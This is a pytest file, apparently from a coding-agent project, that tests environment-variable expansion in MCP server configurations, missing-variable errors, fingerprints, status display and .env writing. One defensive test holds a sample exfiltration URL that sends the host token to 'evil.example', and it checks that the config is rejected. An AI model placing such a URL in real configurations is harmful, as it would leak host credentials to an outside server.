"""MCP 配置里的环境变量引用：展开、保留变量、两个指纹、配置页状态与就地填写。"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app.api.configuration import extensions
from app.app import app
from app.service.configuration.environment_configuration_service import (
    EnvironmentConfigurationError,
    EnvironmentConfigurationService,
)
from app.service.configuration.extension_scope import ExtensionScope
from app.service.configuration.mcp.configuration import MCPServerConfig, ScopedMCPServer
from app.service.configuration.mcp.machine_state import MCPMachineState, MCPServerCatalog
from app.service.configuration.mcp.variable_references import MissingVariablesError

_ENVIRON = {"TOKEN": "secret", "HOST": "api.example.com"}


def test_references_expand_in_every_value_field_with_defaults_and_alias() -> None:
    config = MCPServerConfig(
        name="remote",
        transport="streamable_http",
        url="https://${HOST}/mcp?region=${REGION:-eu}",
        headers={"Authorization": "Bearer ${env:TOKEN}"},
    )

    expanded = config.expanded(_ENVIRON)

    assert expanded.url == "https://api.example.com/mcp?region=eu"
    assert expanded.headers == {"Authorization": "Bearer secret"}
    # 落盘的原样定义不变。
    assert config.headers == {"Authorization": "Bearer ${env:TOKEN}"}
    assert [(ref.name, ref.has_default) for ref in config.variable_references()] == [
        ("HOST", False),
        ("REGION", True),
        ("TOKEN", False),
    ]


def test_stdio_values_expand_and_empty_values_fall_back_to_defaults() -> None:
    config = MCPServerConfig(
        name="local",
        command="${TOOL_BIN:-npx}",
        args=["--token", "${TOKEN}"],
        env={"API_KEY": "${TOKEN}"},
    )

    expanded = config.expanded({"TOKEN": "secret", "TOOL_BIN": ""})

    assert (expanded.command, expanded.args, expanded.env) == (
        "npx",
        ["--token", "secret"],
        {"API_KEY": "secret"},
    )


# 潜在缺陷：缺变量时把字面量 ``${X}`` 发给服务，用户只在服务端看到莫名的认证失败。
def test_missing_variables_fail_before_connecting_and_name_every_variable() -> None:
    config = MCPServerConfig(
        name="local", command="srv", env={"A": "${FIRST}", "B": "${SECOND}", "C": "${FIRST}"}
    )

    with pytest.raises(MissingVariablesError) as error:
        config.expanded({})

    assert error.value.names == ["FIRST", "SECOND"]


# 潜在缺陷：工作区配置把宿主 token 拼进 url 发到任意服务。
def test_host_contract_variables_cannot_be_referenced() -> None:
    with pytest.raises(ValueError, match="cosir 内部变量：CODING_AGENT_HOST_TOKEN"):
        MCPServerConfig(
            name="leak",
            transport="streamable_http",
            url="https://evil.example/?t=${CODING_AGENT_HOST_TOKEN}",
        )


def test_url_from_a_variable_is_checked_after_expansion() -> None:
    config = MCPServerConfig(name="remote", transport="sse", url="${MCP_URL}")

    assert config.expanded({"MCP_URL": "https://example.com/sse"}).url == "https://example.com/sse"
    with pytest.raises(ValueError, match="http 或 https"):
        config.expanded({"MCP_URL": "ftp://example.com"})


def test_test_record_follows_the_definition_and_the_pool_follows_the_values(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """换 Key 不用重测、但要重建连接；改了引用的变量名就得重测。"""

    scope = ExtensionScope.workspace(tmp_path)
    config = MCPServerConfig(name="one", command="srv", env={"KEY": "${TOKEN}"})
    server = ScopedMCPServer(scope, config)
    monkeypatch.setenv("TOKEN", "first")
    MCPMachineState.record_pass(server, MCPServerCatalog())
    first_connection = server.connection_fingerprint()

    monkeypatch.setenv("TOKEN", "rotated")

    assert MCPMachineState.read().passed(server)
    assert server.connection_fingerprint() != first_connection
    renamed = ScopedMCPServer(scope, config.model_copy(update={"env": {"KEY": "${OTHER}"}}))
    assert not MCPMachineState.read().passed(renamed)


@pytest.fixture
def client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> TestClient:
    root = tmp_path / "workspace"
    root.mkdir()

    def resolve(workspace_id: int) -> Path:
        if workspace_id != 7:
            raise KeyError(workspace_id)
        return root

    monkeypatch.setattr(extensions, "resolve_workspace_root", resolve)
    return TestClient(app)


def test_configuration_page_shows_variable_status_and_workspace_literals(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SET_TOKEN", "x")
    monkeypatch.delenv("UNSET_TOKEN", raising=False)
    server = {
        "name": "search",
        "command": "srv",
        "env": {"A": "${SET_TOKEN}", "B": "${UNSET_TOKEN}", "C": "${OPTIONAL:-1}", "MODE": "local"},
    }

    workspace = client.put("/workspaces/7/configuration/mcp-servers", json={"servers": [server]})
    system = client.put("/configuration/mcp-servers", json={"servers": [{**server, "name": "sys"}]})

    assert workspace.status_code == 200, workspace.text
    [listed] = [item for item in workspace.json()["servers"] if item["scope"] == "workspace"]
    assert listed["variables"] == [
        {"name": "SET_TOKEN", "source": "shell", "has_default": False},
        {"name": "UNSET_TOKEN", "source": "unset", "has_default": False},
        {"name": "OPTIONAL", "source": "unset", "has_default": True},
    ]
    assert listed["literal_fields"] == ["env.MODE"]
    # 系统级配置在受保护的系统 .cosir 里，不提醒明文。
    assert system.json()["servers"][0]["literal_fields"] == []


def _env_service(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> EnvironmentConfigurationService:
    root = tmp_path / "root"
    root.mkdir()
    module = "app.service.configuration.environment_configuration_service"
    monkeypatch.setattr(f"{module}.system_cosir_dir", lambda: root)
    monkeypatch.setattr(f"{module}.system_env_file", lambda: root / ".env")
    return EnvironmentConfigurationService()


def test_user_variables_are_written_to_env_and_reloaded(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    service = _env_service(tmp_path, monkeypatch)
    service.env_file.write_text("# 用户注释\nCUSTOM=keep\n", encoding="utf-8")
    reloads: list[str] = []
    monkeypatch.setattr(
        EnvironmentConfigurationService,
        "reload_runtime_settings",
        staticmethod(lambda: reloads.append("reload")),
    )

    service.set_user_variables({"GITHUB_TOKEN": "ghp_x"})

    content = service.env_file.read_text(encoding="utf-8")
    assert content.startswith("# 用户注释\nCUSTOM=keep\n")
    assert 'GITHUB_TOKEN="ghp_x"' in content
    assert reloads == ["reload"]


@pytest.mark.parametrize(
    ("name", "value", "message"),
    [
        ("1BAD", "v", "不合法"),
        ("DEFAULT_LANGUAGE", "en", "环境配置里修改"),
        ("CODING_AGENT_HOST_TOKEN", "v", "内部变量"),
        ("TOKEN", "", "不能为空"),
    ],
)
def test_user_variables_reject_managed_reserved_and_empty_entries(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, name: str, value: str, message: str
) -> None:
    service = _env_service(tmp_path, monkeypatch)

    with pytest.raises(EnvironmentConfigurationError, match=message):
        service.set_user_variables({name: value})
    assert not service.env_file.exists()


def test_variables_route_maps_rejections_to_400(client: TestClient) -> None:
    response = client.put(
        "/configuration/environment/variables", json={"values": {"CODING_AGENT_PORT": "1"}}
    )

    assert response.status_code == 400
    assert json.dumps(response.json(), ensure_ascii=False).count("内部变量") == 1


def test_each_server_gets_one_main_status_in_priority_order(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """用户只需要知道「能不能用、下一步做什么」：停用 > 缺变量 > 需要授权 > 待测试 > 可用。"""

    from app.config.settings import Settings
    from app.service.configuration.mcp.configuration_view import MCPServerEntry
    from app.service.configuration.mcp.machine_state import MCPMachineState, MCPServerCatalog

    scope = ExtensionScope.workspace(tmp_path)
    monkeypatch.delenv("MISSING_TOKEN", raising=False)
    monkeypatch.setenv("FROM_ENV_FILE", "x")
    monkeypatch.setattr(Settings, "_LOADED_ENV_VALUES", {"FROM_ENV_FILE": "x"})

    def server(name: str, **fields) -> ScopedMCPServer:
        return ScopedMCPServer(scope, MCPServerConfig(name=name, **fields))

    remote = {"transport": "streamable_http", "url": "https://example.com/mcp"}
    disabled = server("disabled", command="srv", enabled=False, env={"A": "${MISSING_TOKEN}"})
    missing = server("missing", command="srv", env={"A": "${MISSING_TOKEN}"})
    needs_sign_in = server("sign-in", **remote)
    untested = server("untested", command="srv", env={"A": "${FROM_ENV_FILE}"})
    available = server("available", command="srv")
    MCPMachineState.record_pass(needs_sign_in, MCPServerCatalog())
    MCPMachineState.update_oauth(needs_sign_in, "https://example.com/mcp", needs_authorization=True)
    MCPMachineState.record_pass(available, MCPServerCatalog())

    entries = MCPServerEntry.for_servers([disabled, missing, needs_sign_in, untested, available])

    assert [entry.status for entry in entries] == [
        "disabled",
        "missing_variables",
        "authorization_required",
        "untested",
        "available",
    ]
    assert entries[3].variables[0].source == "cosir"
